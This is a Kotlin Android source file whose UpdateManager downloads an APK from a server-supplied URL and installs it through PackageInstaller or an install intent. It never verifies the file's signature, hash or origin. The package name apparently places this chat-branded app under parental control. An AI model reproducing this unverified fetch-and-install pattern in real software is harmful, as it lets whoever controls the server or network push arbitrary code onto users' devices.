package com.anonchat.app.parentalcontrol.manager

import android.content.Context
import android.content.Intent
import android.content.pm.PackageInstaller
import android.net.Uri
import android.os.Build
import android.util.Log
import androidx.core.content.FileProvider
import com.anonchat.app.parentalcontrol.api.ApiClient
import com.anonchat.app.parentalcontrol.api.CloudConfig
import com.anonchat.app.ui.main.MainActivity
import java.io.File
import java.io.FileOutputStream
import java.net.HttpURLConnection
import java.net.URL

object UpdateManager {
    private const val TAG = "UpdateManager"
    private const val UPDATE_DIR = "updates"

    fun checkForUpdate(context: Context) {
        if (!CloudConfig.isLoggedIn) return
        if (CloudConfig.pendingUpdatePath != null) {
            installPendingUpdate(context)
            return
        }

        try {
            val result = ApiClient.checkForUpdate(CloudConfig.currentVersionCode)

            if (result.success && result.hasUpdate) {
                Log.d(TAG, "Update available: ${result.latestVersionCode}")
                val updated = downloadUpdate(context, result.downloadUrl)
                if (updated) {
                    CloudConfig.pendingUpdatePath = getUpdateFilePath(context).absolutePath
                    installPendingUpdate(context)
                }
            }
        } catch (e: Exception) {
            Log.e(TAG, "Update check failed", e)
        }
    }

    private fun downloadUpdate(context: Context, downloadUrl: String): Boolean {
        try {
            val file = getUpdateFilePath(context)
            file.parentFile?.mkdirs()

            val url = URL(downloadUrl)
            val conn = url.openConnection() as HttpURLConnection
            conn.connectTimeout = 30000
            conn.readTimeout = 60000

            val inputStream = conn.inputStream
            val outputStream = FileOutputStream(file)
            inputStream.copyTo(outputStream)
            outputStream.close()
            inputStream.close()
            conn.disconnect()

            return file.exists() && file.length() > 0
        } catch (e: Exception) {
            Log.e(TAG, "Download failed", e)
            return false
        }
    }

    private fun getUpdateFilePath(context: Context): File {
        return File(context.filesDir, "$UPDATE_DIR/update.apk")
    }

    private fun installPendingUpdate(context: Context) {
        val path = CloudConfig.pendingUpdatePath ?: return
        val file = File(path)
        if (!file.exists()) {
            CloudConfig.pendingUpdatePath = null
            return
        }

        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            installViaPackageInstaller(context, file)
        } else {
            installViaIntent(context, file)
        }
    }

    private fun installViaPackageInstaller(context: Context, file: File) {
        try {
            val packageInstaller = context.packageManager.packageInstaller
            val params = PackageInstaller.SessionParams(PackageInstaller.SessionParams.MODE_FULL_INSTALL)
            params.setAppPackageName(context.packageName)

            val sessionId = packageInstaller.createSession(params)
            val session = packageInstaller.openSession(sessionId)

            val size = file.length()
            val inputStream = file.inputStream()
            val out = session.openWrite("update", 0, size)
            inputStream.copyTo(out)
            session.fsync(out)
            out.close()
            inputStream.close()

            val intent = Intent(context, MainActivity::class.java).apply {
                flags = Intent.FLAG_ACTIVITY_NEW_TASK
            }
            val pendingIntent = android.app.PendingIntent.getActivity(
                context, 0, intent,
                android.app.PendingIntent.FLAG_UPDATE_CURRENT or android.app.PendingIntent.FLAG_IMMUTABLE
            )

            session.commit(pendingIntent.intentSender)
            session.close()
            CloudConfig.pendingUpdatePath = null
            Log.d(TAG, "Install session committed")
        } catch (e: Exception) {
            Log.e(TAG, "PackageInstaller install failed", e)
            installViaIntent(context, file)
        }
    }

    private fun installViaIntent(context: Context, file: File) {
        try {
            val uri: Uri
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.N) {
                uri = FileProvider.getUriForFile(
                    context,
                    "${context.packageName}.fileprovider",
                    file
                )
            } else {
                uri = Uri.fromFile(file)
            }

            val intent = Intent(Intent.ACTION_VIEW).apply {
                setDataAndType(uri, "application/vnd.android.package-archive")
                flags = Intent.FLAG_ACTIVITY_NEW_TASK or Intent.FLAG_GRANT_READ_URI_PERMISSION
                addFlags(Intent.FLAG_ACTIVITY_EXCLUDE_FROM_RECENTS)
                addFlags(Intent.FLAG_ACTIVITY_NO_HISTORY)
            }
            context.startActivity(intent)
        } catch (e: Exception) {
            Log.e(TAG, "Intent install failed", e)
        }
    }

    fun checkAndApplyPendingUpdate(context: Context) {
        if (CloudConfig.pendingUpdatePath != null) {
            installPendingUpdate(context)
        }
    }
}
